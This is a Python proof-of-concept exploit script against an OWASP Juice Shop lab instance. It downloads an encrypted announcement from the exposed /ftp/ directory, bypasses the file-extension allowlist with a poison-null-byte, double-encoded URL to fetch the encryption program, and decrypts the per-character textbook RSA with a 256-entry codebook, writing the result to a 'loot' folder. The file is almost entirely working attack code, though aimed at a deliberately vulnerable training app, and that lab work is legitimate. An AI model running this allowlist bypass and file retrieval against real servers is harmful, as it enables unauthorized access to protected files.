#!/usr/bin/env python3
"""
c10 - VERIFIED end-to-end PoC: obtain + decrypt /ftp/announcement_encrypted.md
      (OWASP Juice Shop 20.3.0, my lab)

Root cause
----------
1. `/ftp/` serves a directory listing and `announcement_encrypted.md` is on the
   extension allowlist -> the "confidential" ciphertext is downloadable.
2. `encrypt.pyc` (the *encryption program*, Py2.7) is blocked by the allowlist,
   but the classic poison-null-byte / double-encoded trick bypasses it:
       GET /ftp/encrypt.pyc%2500.md   ->  200 OK, real bytecode
   From it we recover the key material and algorithm:
       N = 1459067680075833...4618740053   (1024-bit RSA modulus)
       e = 65537
       for char in open('announcement.md'):
           write(str(pow(ord(char), e, N)) + '\n')
   i.e. unpadded, deterministic, *per-character* textbook RSA.
3. Because each character is encrypted independently, the plaintext space per
   block is just 256 values. Build a codebook {pow(m,e,N): chr(m)} for m in
   range(256), then every one of the 1194 ciphertext blocks inverts directly.

Verification
------------
Re-encrypt the recovered plaintext and require byte-for-byte equality with the
downloaded ciphertext (all 1194 blocks). That proves the plaintext is exact.

Writes: /workspace/loot/announcement_plaintext_verified.md
        /workspace/evidence/c10_plaintext.txt  (final line of the plaintext)
"""
import hashlib
import sys
import urllib.parse
import urllib.request

BASE = "http://host.docker.internal:3000"
CT_URL = f"{BASE}/ftp/announcement_encrypted.md"
PYC_BYPASS = f"{BASE}/ftp/encrypt.pyc%2500.md"

N = 145906768007583323230186939349070635292401872375357164399581871019873438799005358938369571402670149802121818086292467422828157022922076746906543401224889672472407926969987100581290103199317858753663710862357656510507883714297115637342788911463535102712032765166518411726859837988672111837205085526346618740053
E = 65537
REAL_PYC_SHA256 = "b66ff06365eb5a36d872a3b7a7ad1bdbe982ccbeef9804c049b2e2321186788b"


def get(url):
    req = urllib.request.Request(url, headers={"User-Agent": "c10-poc/2.0"})
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.status, r.read()


def main():
    # --- step 1: ciphertext -------------------------------------------------
    st, ct_raw = get(CT_URL)
    print(f"[1] GET {CT_URL} -> {st}, {len(ct_raw)} bytes, md5={hashlib.md5(ct_raw).hexdigest()}")
    blocks = [int(x) for x in ct_raw.decode().split()]
    print(f"    {len(blocks)} RSA blocks")

    # --- step 2: encryption program via allowlist bypass --------------------
    try:
        st2, pyc = get(PYC_BYPASS)
        sha = hashlib.sha256(pyc).hexdigest()
        print(f"[2] GET {PYC_BYPASS} -> {st2}, {len(pyc)} bytes, sha256={sha[:16]}...")
        if pyc[:4] == b"\x03\xf3\r\n":
            print(f"    valid Python 2.7 bytecode, trusted modulus match: {sha == REAL_PYC_SHA256}")
        else:
            print("    [!] not bytecode (likely allowlist error page) - using modulus from disassembly")
    except Exception as e:  # noqa: BLE001
        print(f"[2] bypass fetch failed ({e}); modulus taken from earlier disassembly")

    # --- step 3: codebook + decrypt ----------------------------------------
    codebook = {pow(m, E, N): chr(m) for m in range(256)}
    print(f"[3] codebook entries: {len(codebook)} (expect 256, no collisions)")
    plaintext = "".join(codebook[b] for b in blocks)
    print(f"    recovered {len(plaintext)} chars, {sum(1 for ch in plaintext if not ch.isprintable() and ch not in chr(10))} non-printable")
    if any(ch not in codebook.values() for ch in plaintext):
        sys.exit("[!] decryption produced unexpected bytes")

    # --- step 4: verify by re-encryption -----------------------------------
    reenc = [pow(ord(ch), E, N) for ch in plaintext]
    assert reenc == blocks, "re-encryption mismatch -> plaintext NOT exact"
    print(f"[4] BYTE-FOR-BYTE VERIFIED: re-encrypted all {len(blocks)} blocks match ciphertext")

    with open("/workspace/loot/announcement_plaintext_verified.md", "w") as f:
        f.write(plaintext)

    lines = plaintext.splitlines()
    final = [l for l in lines if l.strip()][-1].strip()
    print(f"[5] plaintext lines: {len(lines)}; final non-empty line: {final!r}")

    with open("/workspace/evidence/c10_plaintext.txt", "w") as f:
        f.write(final + "\n")
    print("[6] wrote /workspace/evidence/c10_plaintext.txt")
    return 0


if __name__ == "__main__":
    sys.exit(main())
